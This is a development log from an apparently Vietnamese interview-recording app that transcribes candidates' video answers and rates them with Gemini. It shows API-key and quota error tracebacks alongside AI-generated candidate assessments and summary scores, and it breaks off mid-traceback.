+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_unary.py", line 294, in retry_wrapped_func
+    return retry_target(
+           ^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_unary.py", line 156, in retry_target
+    next_sleep = _retry_error_helper(
+                 ^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_base.py", line 214, in _retry_error_helper
+    raise final_exc from source_exc
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_unary.py", line 147, in retry_target
+    result = target()
+             ^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\timeout.py", line 130, in func_with_timeout
+    return func(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\grpc_helpers.py", line 77, in error_remapped_callable
+    raise exceptions.from_grpc_error(exc) from exc
+google.api_core.exceptions.PermissionDenied: 403 Your API key was reported as leaked. Please use another API key.
+
+2025-12-10 11:13:51,565 - app.services.ai_service - INFO - ✅ Layer 2 completed - Priority: MEDIUM
+2025-12-10 11:13:51,576 - app.services.ai_service - INFO - ✅ [Background] Full analysis completed for Q1
+2025-12-10 11:14:09,516 - app.routers - INFO - Upload request - Folder: 10_12_2025_11_13_ho, Question: 3
+2025-12-10 11:14:10,474 - app.services.file_service - INFO - ✅ Converted to MP4: Q3.mp4
+2025-12-10 11:14:10,493 - app.services.ai_service - INFO - 🎤 [Background] Starting analysis for Q3...
+2025-12-10 11:14:10,538 - app.services.ai_service - INFO - 🎤 Transcribing Q3...
+2025-12-10 11:14:14,263 - app.services.ai_service - INFO - 📄 Transcript saved: Q3_transcript.txt
+2025-12-10 11:14:14,264 - app.services.ai_service - INFO - 📊 Running Layer 1 analysis for Q3...
+2025-12-10 11:14:14,266 - app.services.ai_service - INFO - ✅ Layer 1 completed - Flagged: True
+2025-12-10 11:14:14,266 - app.services.ai_service - INFO - 🤖 Running Layer 2 AI analysis for Q3...
+2025-12-10 11:14:14,268 - app.services.ai_service - INFO - 🤖 Calling Gemini for Layer 2 analysis...
+2025-12-10 11:14:14,378 - app.services.ai_service - ERROR - ❌ Gemini API error: 403 Your API key was reported as leaked. Please use another API key.
+2025-12-10 11:14:14,380 - app.services.ai_service - ERROR - Full traceback: Traceback (most recent call last):
+  File "D:\web-interview-recorder\app\services\ai_service.py", line 295, in analyze_layer2_ai
+    response = await asyncio.to_thread(
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\asyncio\threads.py", line 25, in to_thread
+    return await loop.run_in_executor(None, func_call)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\concurrent\futures\thread.py", line 58, in run
+    result = self.fn(*self.args, **self.kwargs)
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\generativeai\generative_models.py", line 331, in generate_content
+    response = self._client.generate_content(
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\ai\generativelanguage_v1beta\services\generative_service\client.py", line 835, in generate_content
+    response = rpc(
+               ^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\gapic_v1\method.py", line 131, in __call__
+    return wrapped_func(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_unary.py", line 294, in retry_wrapped_func
+    return retry_target(
+           ^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_unary.py", line 156, in retry_target
+    next_sleep = _retry_error_helper(
+                 ^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_base.py", line 214, in _retry_error_helper
+    raise final_exc from source_exc
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_unary.py", line 147, in retry_target
+    result = target()
+             ^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\timeout.py", line 130, in func_with_timeout
+    return func(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\grpc_helpers.py", line 77, in error_remapped_callable
+    raise exceptions.from_grpc_error(exc) from exc
+google.api_core.exceptions.PermissionDenied: 403 Your API key was reported as leaked. Please use another API key.
+
+2025-12-10 11:14:14,381 - app.services.ai_service - INFO - ✅ Layer 2 completed - Priority: MEDIUM
+2025-12-10 11:14:14,385 - app.services.ai_service - INFO - ✅ [Background] Full analysis completed for Q3
+2025-12-10 11:20:01,996 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2025-12-10 11:20:06,002 - app.services.ai_service - INFO - ✅ Whisper loaded
+2025-12-10 11:20:06,002 - app.services.ai_service - INFO - ✅ Gemini initialized
+2025-12-10 11:22:09,714 - app.routers - INFO - Upload request - Folder: 10_12_2025_11_21_hồng, Question: 1
+2025-12-10 11:22:11,250 - app.services.file_service - INFO - ✅ Converted to MP4: Q1.mp4
+2025-12-10 11:22:11,262 - app.services.ai_service - INFO - 🎤 [Background] Starting analysis for Q1...
+2025-12-10 11:22:11,307 - app.services.ai_service - INFO - 🎤 Transcribing Q1...
+2025-12-10 11:22:15,773 - app.services.ai_service - INFO - 📄 Transcript saved: Q1_transcript.txt
+2025-12-10 11:22:15,774 - app.services.ai_service - INFO - 📊 Running Layer 1 analysis for Q1...
+2025-12-10 11:22:15,775 - app.services.ai_service - INFO - ✅ Layer 1 completed - Flagged: True
+2025-12-10 11:22:15,777 - app.services.ai_service - INFO - 🤖 Running Layer 2 AI analysis for Q1...
+2025-12-10 11:22:15,777 - app.services.ai_service - INFO - 🤖 Calling Gemini for Layer 2 analysis...
+2025-12-10 11:22:23,793 - app.services.ai_service - INFO - 📥 Raw Gemini response (first 200 chars): {
+  "priority": "LOW",
+  "reason": "The candidate's introduction is excessively brief, providing minimal background information and failing to elaborate on their studies or motivations, which is a mis
+2025-12-10 11:22:23,793 - app.services.ai_service - INFO - ✅ AI Analysis completed - Priority: LOW
+2025-12-10 11:22:23,796 - app.services.ai_service - INFO - ✅ Layer 2 completed - Priority: LOW
+2025-12-10 11:22:23,800 - app.services.ai_service - INFO - ✅ [Background] Full analysis completed for Q1
+2025-12-10 11:25:36,305 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2025-12-10 11:25:40,484 - app.services.ai_service - INFO - ✅ Whisper loaded
+2025-12-10 11:25:40,485 - app.services.ai_service - INFO - ✅ Gemini initialized
+2025-12-10 11:26:33,978 - app.routers - INFO - Upload request - Folder: 10_12_2025_11_25_hong, Question: 1
+2025-12-10 11:26:36,097 - app.services.file_service - INFO - ✅ Converted to MP4: Q1.mp4
+2025-12-10 11:26:36,107 - app.services.ai_service - INFO - 🎤 [Background] Starting analysis for Q1...
+2025-12-10 11:26:36,188 - app.services.ai_service - INFO - 🎤 Transcribing Q1...
+2025-12-10 11:26:42,136 - app.services.ai_service - INFO - 📄 Transcript saved: Q1_transcript.txt
+2025-12-10 11:26:42,136 - app.services.ai_service - INFO - 📊 Running Layer 1 analysis for Q1...
+2025-12-10 11:26:42,138 - app.services.ai_service - INFO - ✅ Layer 1 completed - Flagged: False
+2025-12-10 11:26:42,140 - app.services.ai_service - INFO - 🤖 Running Layer 2 AI analysis for Q1...
+2025-12-10 11:26:42,142 - app.services.ai_service - INFO - 🤖 Calling Gemini for Layer 2 analysis...
+2025-12-10 11:26:49,566 - app.services.ai_service - INFO - 📥 Raw Gemini response (first 200 chars): {
+  "priority": "MEDIUM",
+  "reason": "The candidate introduces themselves and their relevant studies, but their stated primary motivation for pursuing data analysis ('make many money') is highly unpr
+2025-12-10 11:26:49,566 - app.services.ai_service - INFO - ✅ AI Analysis completed - Priority: MEDIUM
+2025-12-10 11:26:49,566 - app.services.ai_service - INFO - ✅ Layer 2 completed - Priority: MEDIUM
+2025-12-10 11:26:49,571 - app.services.ai_service - INFO - ✅ [Background] Full analysis completed for Q1
+2025-12-10 11:27:23,781 - app.routers - INFO - Upload request - Folder: 10_12_2025_11_25_hong, Question: 2
+2025-12-10 11:27:28,136 - app.services.file_service - INFO - ✅ Converted to MP4: Q2.mp4
+2025-12-10 11:27:28,149 - app.services.ai_service - INFO - 🎤 [Background] Starting analysis for Q2...
+2025-12-10 11:27:28,241 - app.services.ai_service - INFO - 🎤 Transcribing Q2...
+2025-12-10 11:27:38,046 - app.services.ai_service - INFO - 📄 Transcript saved: Q2_transcript.txt
+2025-12-10 11:27:38,048 - app.services.ai_service - INFO - 📊 Running Layer 1 analysis for Q2...
+2025-12-10 11:27:38,048 - app.services.ai_service - INFO - ✅ Layer 1 completed - Flagged: False
+2025-12-10 11:27:38,051 - app.services.ai_service - INFO - 🤖 Running Layer 2 AI analysis for Q2...
+2025-12-10 11:27:38,051 - app.services.ai_service - INFO - 🤖 Calling Gemini for Layer 2 analysis...
+2025-12-10 11:27:45,265 - app.services.ai_service - INFO - 📥 Raw Gemini response (first 200 chars): {
+  "priority": "MEDIUM",
+  "reason": "The candidate expresses relevant interests (diverse departments, skill development, generating insights) but struggles with professional articulation and grammar
+2025-12-10 11:27:45,266 - app.services.ai_service - INFO - ✅ AI Analysis completed - Priority: MEDIUM
+2025-12-10 11:27:45,267 - app.services.ai_service - INFO - ✅ Layer 2 completed - Priority: MEDIUM
+2025-12-10 11:27:45,271 - app.services.ai_service - INFO - ✅ [Background] Full analysis completed for Q2
+2025-12-10 11:30:18,420 - app.routers - INFO - Upload request - Folder: 10_12_2025_11_25_hong, Question: 3
+2025-12-10 11:30:18,990 - app.services.file_service - INFO - ✅ Converted to MP4: Q3.mp4
+2025-12-10 11:30:19,013 - app.services.ai_service - INFO - 🎤 [Background] Starting analysis for Q3...
+2025-12-10 11:30:19,056 - app.services.ai_service - INFO - 🎤 Transcribing Q3...
+2025-12-10 11:30:22,993 - app.services.ai_service - INFO - 📄 Transcript saved: Q3_transcript.txt
+2025-12-10 11:30:22,994 - app.services.ai_service - INFO - 📊 Running Layer 1 analysis for Q3...
+2025-12-10 11:30:22,994 - app.services.ai_service - INFO - ✅ Layer 1 completed - Flagged: True
+2025-12-10 11:30:22,994 - app.services.ai_service - INFO - 🤖 Running Layer 2 AI analysis for Q3...
+2025-12-10 11:30:22,994 - app.services.ai_service - INFO - 🤖 Calling Gemini for Layer 2 analysis...
+2025-12-10 11:30:27,772 - app.services.ai_service - INFO - 📥 Raw Gemini response (first 200 chars): {
+  "priority": "LOW",
+  "reason": "The candidate's response is completely irrelevant to the question asked, demonstrating a severe lack of understanding or focus on the interview topic.",
+  "content_
+2025-12-10 11:30:27,773 - app.services.ai_service - INFO - ✅ AI Analysis completed - Priority: LOW
+2025-12-10 11:30:27,774 - app.services.ai_service - INFO - ✅ Layer 2 completed - Priority: LOW
+2025-12-10 11:30:27,778 - app.services.ai_service - INFO - ✅ [Background] Full analysis completed for Q3
+2025-12-10 11:31:21,630 - app.routers - INFO - Upload request - Folder: 10_12_2025_11_25_hong, Question: 4
+2025-12-10 11:31:26,030 - app.services.file_service - INFO - ✅ Converted to MP4: Q4.mp4
+2025-12-10 11:31:26,040 - app.services.ai_service - INFO - 🎤 [Background] Starting analysis for Q4...
+2025-12-10 11:31:26,150 - app.services.ai_service - INFO - 🎤 Transcribing Q4...
+2025-12-10 11:31:35,210 - app.services.ai_service - INFO - 📄 Transcript saved: Q4_transcript.txt
+2025-12-10 11:31:35,210 - app.services.ai_service - INFO - 📊 Running Layer 1 analysis for Q4...
+2025-12-10 11:31:35,210 - app.services.ai_service - INFO - ✅ Layer 1 completed - Flagged: False
+2025-12-10 11:31:35,210 - app.services.ai_service - INFO - 🤖 Running Layer 2 AI analysis for Q4...
+2025-12-10 11:31:35,216 - app.services.ai_service - INFO - 🤖 Calling Gemini for Layer 2 analysis...
+2025-12-10 11:31:45,638 - app.services.ai_service - INFO - 📥 Raw Gemini response (first 200 chars): {
+  "priority": "MEDIUM",
+  "reason": "The candidate correctly identifies `GROUP BY` and `HAVING` as key clauses but struggles significantly with clear articulation, providing an incomplete SQL soluti
+2025-12-10 11:31:45,638 - app.services.ai_service - INFO - ✅ AI Analysis completed - Priority: MEDIUM
+2025-12-10 11:31:45,641 - app.services.ai_service - INFO - ✅ Layer 2 completed - Priority: MEDIUM
+2025-12-10 11:31:45,644 - app.services.ai_service - INFO - ✅ [Background] Full analysis completed for Q4
+2025-12-10 11:32:20,329 - app.services.ai_service - INFO - 🤖 Generating overall AI summary with Gemini...
+2025-12-10 11:32:27,489 - app.services.ai_service - INFO - 📥 Gemini overall response (first 200 chars): {
+  "overall_summary": "The candidate demonstrates good communication metrics with low filler words and no silences, maintaining focus throughout. However, a critical question regarding data cleaning 
+2025-12-10 11:32:27,490 - app.services.ai_service - INFO - ✅ Overall AI summary generated - Recommendation: NEUTRAL
+2025-12-10 11:32:27,494 - app.services.ai_service - INFO - 📄 Full transcript saved: FULL_TRANSCRIPT.txt
+2025-12-10 11:32:27,496 - app.services.ai_service - INFO - ✅ Final ranking calculated - Priority: MEDIUM
+2025-12-10 11:32:27,496 - app.services.ai_service - INFO - 📊 Summary: {
+  "total_questions_analyzed": 4,
+  "avg_word_count": 42,
+  "avg_filler_density_percent": 0.36,
+  "avg_silence_ratio_percent": 0.0,
+  "avg_wpm": 126.28,
+  "avg_focus_score": 98.25,
+  "avg_content_score": 4.5,
+  "avg_communication_score": 4,
+  "final_priority": "MEDIUM",
+  "final_reason": "Ứng viên trung bình - Cần xem xét kỹ hơn",
+  "priority_distribution": {
+    "HIGH": 0,
+    "MEDIUM": 3,
+    "LOW": 1
+  },
+  "overall_ai_summary": {
+    "overall_summary": "The candidate demonstrates good communication metrics with low filler words and no silences, maintaining focus throughout. However, a critical question regarding data cleaning was completely missed, and other responses were generally brief and lacked depth, indicating potential gaps in foundational knowledge for a Data Analyst role.",
+    "strengths": [
+      "Good communication metrics (low filler, no silence, high focus)",
+      "Expressed interest in diverse aspects of data analysis and skill development",
+      "Basic understanding of SQL for identifying duplicates"
+    ],
+    "weaknesses": [
+      "Completely missed a fundamental question on data cleaning",
+      "Answers were generally brief and lacked depth (low average word count)",
+      "Motivation for 'making money' in introduction was unprofessional",
+      "SQL answer was basic and incomplete"
+    ],
+    "recommendation": "NEUTRAL"
+  }
+}
+2025-12-10 11:38:57,905 - app.routers - INFO - Upload request - Folder: 10_12_2025_11_38_ho, Question: 1
+2025-12-10 11:38:58,771 - app.services.file_service - INFO - ✅ Converted to MP4: Q1.mp4
+2025-12-10 11:38:58,786 - app.services.ai_service - INFO - 🎤 [Background] Starting analysis for Q1...
+2025-12-10 11:38:58,827 - app.services.ai_service - INFO - 🎤 Transcribing Q1...
+2025-12-10 11:39:03,050 - app.services.ai_service - INFO - 📄 Transcript saved: Q1_transcript.txt
+2025-12-10 11:39:03,056 - app.services.ai_service - INFO - 📊 Running Layer 1 analysis for Q1...
+2025-12-10 11:39:03,056 - app.services.ai_service - INFO - ✅ Layer 1 completed - Flagged: True
+2025-12-10 11:39:03,056 - app.services.ai_service - INFO - 🤖 Running Layer 2 AI analysis for Q1...
+2025-12-10 11:39:03,056 - app.services.ai_service - INFO - 🤖 Calling Gemini for Layer 2 analysis...
+2025-12-10 11:39:05,486 - app.routers - INFO - Upload request - Folder: 10_12_2025_11_38_ho, Question: 2
+2025-12-10 11:39:05,786 - app.services.file_service - INFO - ✅ Converted to MP4: Q2.mp4
+2025-12-10 11:39:05,798 - app.services.ai_service - INFO - 🎤 [Background] Starting analysis for Q2...
+2025-12-10 11:39:05,836 - app.services.ai_service - INFO - 🎤 Transcribing Q2...
+2025-12-10 11:39:09,478 - app.services.ai_service - INFO - 📄 Transcript saved: Q2_transcript.txt
+2025-12-10 11:39:09,478 - app.services.ai_service - INFO - 📊 Running Layer 1 analysis for Q2...
+2025-12-10 11:39:09,478 - app.services.ai_service - INFO - ✅ Layer 1 completed - Flagged: True
+2025-12-10 11:39:09,478 - app.services.ai_service - INFO - 🤖 Running Layer 2 AI analysis for Q2...
+2025-12-10 11:39:09,478 - app.services.ai_service - INFO - 🤖 Calling Gemini for Layer 2 analysis...
+2025-12-10 11:39:11,326 - app.services.ai_service - INFO - 📥 Raw Gemini response (first 200 chars): {
+  "priority": "MEDIUM",
+  "reason": "The candidate's response is extremely brief, providing only their name and current academic status without any further detail or context expected for an introduc
+2025-12-10 11:39:11,326 - app.services.ai_service - INFO - ✅ AI Analysis completed - Priority: MEDIUM
+2025-12-10 11:39:11,326 - app.services.ai_service - INFO - ✅ Layer 2 completed - Priority: MEDIUM
+2025-12-10 11:39:11,326 - app.services.ai_service - INFO - ✅ [Background] Full analysis completed for Q1
+2025-12-10 11:39:12,828 - app.services.ai_service - INFO - 📥 Raw Gemini response (first 200 chars): {
+  "priority": "LOW",
+  "reason": "The candidate provided no relevant content, failing to answer the question entirely. This indicates a significant lack of communication skills and professionalism."
+2025-12-10 11:39:12,829 - app.services.ai_service - INFO - ✅ AI Analysis completed - Priority: LOW
+2025-12-10 11:39:12,830 - app.services.ai_service - INFO - ✅ Layer 2 completed - Priority: LOW
+2025-12-10 11:39:12,846 - app.services.ai_service - INFO - ✅ [Background] Full analysis completed for Q2
+2025-12-10 11:39:12,994 - app.routers - INFO - Upload request - Folder: 10_12_2025_11_38_ho, Question: 3
+2025-12-10 11:39:13,342 - app.services.file_service - INFO - ✅ Converted to MP4: Q3.mp4
+2025-12-10 11:39:13,356 - app.services.ai_service - INFO - 🎤 [Background] Starting analysis for Q3...
+2025-12-10 11:39:13,392 - app.services.ai_service - INFO - 🎤 Transcribing Q3...
+2025-12-10 11:39:16,798 - app.services.ai_service - INFO - 📄 Transcript saved: Q3_transcript.txt
+2025-12-10 11:39:16,805 - app.services.ai_service - INFO - 📊 Running Layer 1 analysis for Q3...
+2025-12-10 11:39:16,806 - app.services.ai_service - INFO - ✅ Layer 1 completed - Flagged: True
+2025-12-10 11:39:16,807 - app.services.ai_service - INFO - 🤖 Running Layer 2 AI analysis for Q3...
+2025-12-10 11:39:16,809 - app.services.ai_service - INFO - 🤖 Calling Gemini for Layer 2 analysis...
+2025-12-10 11:39:20,556 - app.services.ai_service - INFO - 📥 Raw Gemini response (first 200 chars): {
+  "priority": "LOW",
+  "reason": "The candidate did not answer the question asked, providing only an informal phrase. This indicates a significant lack of content, poor communication, and unprofessi
+2025-12-10 11:39:20,556 - app.services.ai_service - INFO - ✅ AI Analysis completed - Priority: LOW
+2025-12-10 11:39:20,556 - app.services.ai_service - INFO - ✅ Layer 2 completed - Priority: LOW
+2025-12-10 11:39:20,556 - app.services.ai_service - INFO - ✅ [Background] Full analysis completed for Q3
+2025-12-10 11:39:20,836 - app.routers - INFO - Upload request - Folder: 10_12_2025_11_38_ho, Question: 4
+2025-12-10 11:39:21,169 - app.services.file_service - INFO - ✅ Converted to MP4: Q4.mp4
+2025-12-10 11:39:21,178 - app.services.ai_service - INFO - 🎤 [Background] Starting analysis for Q4...
+2025-12-10 11:39:21,226 - app.services.ai_service - INFO - 🎤 Transcribing Q4...
+2025-12-10 11:39:24,336 - app.services.ai_service - INFO - 📄 Transcript saved: Q4_transcript.txt
+2025-12-10 11:39:24,336 - app.services.ai_service - INFO - 📊 Running Layer 1 analysis for Q4...
+2025-12-10 11:39:24,338 - app.services.ai_service - INFO - ✅ Layer 1 completed - Flagged: True
+2025-12-10 11:39:24,340 - app.services.ai_service - INFO - 🤖 Running Layer 2 AI analysis for Q4...
+2025-12-10 11:39:24,341 - app.services.ai_service - INFO - 🤖 Calling Gemini for Layer 2 analysis...
+2025-12-10 11:39:24,606 - app.services.ai_service - ERROR - ❌ Gemini API error: 429 You exceeded your current quota, please check your plan and billing details. For more information on this error, head to: https://ai.google.dev/gemini-api/docs/rate-limits. To monitor your current usage, head to: https://ai.dev/usage?tab=rate-limit. 
+* Quota exceeded for metric: generativelanguage.googleapis.com/generate_content_free_tier_requests, limit: 20, model: gemini-2.5-flash
+Please retry in 36.493979424s. [links {
+  description: "Learn more about Gemini API quotas"
+  url: "https://ai.google.dev/gemini-api/docs/rate-limits"
+}
+, violations {
+  quota_metric: "generativelanguage.googleapis.com/generate_content_free_tier_requests"
+  quota_id: "GenerateRequestsPerDayPerProjectPerModel-FreeTier"
+  quota_dimensions {
+    key: "model"
+    value: "gemini-2.5-flash"
+  }
+  quota_dimensions {
+    key: "location"
+    value: "global"
+  }
+  quota_value: 20
+}
+, retry_delay {
+  seconds: 36
+}
+]
+2025-12-10 11:39:24,626 - app.services.ai_service - ERROR - Full traceback: Traceback (most recent call last):
+  File "D:\web-interview-recorder\app\services\ai_service.py", line 295, in analyze_layer2_ai
+    response = await asyncio.to_thread(
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\asyncio\threads.py", line 25, in to_thread
+    return await loop.run_in_executor(None, func_call)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\concurrent\futures\thread.py", line 58, in run
+    result = self.fn(*self.args, **self.kwargs)
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\generativeai\generative_models.py", line 331, in generate_content
+    response = self._client.generate_content(
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\ai\generativelanguage_v1beta\services\generative_service\client.py", line 835, in generate_content
+    response = rpc(
+               ^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\gapic_v1\method.py", line 131, in __call__
+    return wrapped_func(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_unary.py", line 294, in retry_wrapped_func
+    return retry_target(
+           ^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_unary.py", line 156, in retry_target
+    next_sleep = _retry_error_helper(
+                 ^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_base.py", line 214, in _retry_error_helper
+    raise final_exc from source_exc
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_unary.py", line 147, in retry_target
+    result = target()
+             ^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\timeout.py", line 130, in func_with_timeout
+    return func(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\grpc_helpers.py", line 77, in error_remapped_callable
+    raise exceptions.from_grpc_error(exc) from exc
+google.api_core.exceptions.ResourceExhausted: 429 You exceeded your current quota, please check your plan and billing details. For more information on this error, head to: https://ai.google.dev/gemini-api/docs/rate-limits. To monitor your current usage, head to: https://ai.dev/usage?tab=rate-limit. 
+* Quota exceeded for metric: generativelanguage.googleapis.com/generate_content_free_tier_requests, limit: 20, model: gemini-2.5-flash
+Please retry in 36.493979424s. [links {
+  description: "Learn more about Gemini API quotas"
+  url: "https://ai.google.dev/gemini-api/docs/rate-limits"
+}
+, violations {
+  quota_metric: "generativelanguage.googleapis.com/generate_content_free_tier_requests"
+  quota_id: "GenerateRequestsPerDayPerProjectPerModel-FreeTier"
+  quota_dimensions {
+    key: "model"
+    value: "gemini-2.5-flash"
+  }
+  quota_dimensions {
+    key: "location"
+    value: "global"
+  }
+  quota_value: 20
+}
+, retry_delay {
+  seconds: 36
+}
+]
+
+2025-12-10 11:39:24,626 - app.services.ai_service - INFO - ✅ Layer 2 completed - Priority: MEDIUM
+2025-12-10 11:39:24,628 - app.services.ai_service - INFO - ✅ [Background] Full analysis completed for Q4
+2025-12-10 11:39:34,476 - app.routers - INFO - Upload request - Folder: 10_12_2025_11_38_ho, Question: 5
+2025-12-10 11:39:34,934 - app.services.file_service - INFO - ✅ Converted to MP4: Q5.mp4
+2025-12-10 11:39:34,948 - app.services.ai_service - INFO - 🎤 [Background] Starting analysis for Q5...
+2025-12-10 11:39:34,984 - app.services.ai_service - INFO - 🎤 Transcribing Q5...
+2025-12-10 11:39:37,868 - app.services.ai_service - INFO - 📄 Transcript saved: Q5_transcript.txt
+2025-12-10 11:39:37,868 - app.services.ai_service - INFO - 📊 Running Layer 1 analysis for Q5...
+2025-12-10 11:39:37,870 - app.services.ai_service - INFO - ✅ Layer 1 completed - Flagged: True
+2025-12-10 11:39:37,872 - app.services.ai_service - INFO - 🤖 Running Layer 2 AI analysis for Q5...
+2025-12-10 11:39:37,872 - app.services.ai_service - INFO - 🤖 Calling Gemini for Layer 2 analysis...
+2025-12-10 11:39:38,139 - app.services.ai_service - ERROR - ❌ Gemini API error: 429 You exceeded your current quota, please check your plan and billing details. For more information on this error, head to: https://ai.google.dev/gemini-api/docs/rate-limits. To monitor your current usage, head to: https://ai.dev/usage?tab=rate-limit. 
+* Quota exceeded for metric: generativelanguage.googleapis.com/generate_content_free_tier_requests, limit: 20, model: gemini-2.5-flash
+Please retry in 22.971787322s. [links {
+  description: "Learn more about Gemini API quotas"
+  url: "https://ai.google.dev/gemini-api/docs/rate-limits"
+}
+, violations {
+  quota_metric: "generativelanguage.googleapis.com/generate_content_free_tier_requests"
+  quota_id: "GenerateRequestsPerDayPerProjectPerModel-FreeTier"
+  quota_dimensions {
+    key: "model"
+    value: "gemini-2.5-flash"
+  }
+  quota_dimensions {
+    key: "location"
+    value: "global"
+  }
+  quota_value: 20
+}
+, retry_delay {
+  seconds: 22
+}
+]
+2025-12-10 11:39:38,140 - app.services.ai_service - ERROR - Full traceback: Traceback (most recent call last):
+  File "D:\web-interview-recorder\app\services\ai_service.py", line 295, in analyze_layer2_ai
+    response = await asyncio.to_thread(
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\asyncio\threads.py", line 25, in to_thread
+    return await loop.run_in_executor(None, func_call)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\concurrent\futures\thread.py", line 58, in run
+    result = self.fn(*self.args, **self.kwargs)
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\generativeai\generative_models.py", line 331, in generate_content
+    response = self._client.generate_content(
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\ai\generativelanguage_v1beta\services\generative_service\client.py", line 835, in generate_content
+    response = rpc(
+               ^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\gapic_v1\method.py", line 131, in __call__
+    return wrapped_func(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_unary.py", line 294, in retry_wrapped_func
+    return retry_target(
+           ^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_unary.py", line 156, in retry_target
+    next_sleep = _retry_error_helper(
+                 ^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_base.py", line 214, in _retry_error_helper
+    raise final_exc from source_exc
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_unary.py", line 147, in retry_target
+    result = target()
+             ^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\timeout.py", line 130, in func_with_timeout
+    return func(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\grpc_helpers.py", line 77, in error_remapped_callable
+    raise exceptions.from_grpc_error(exc) from exc
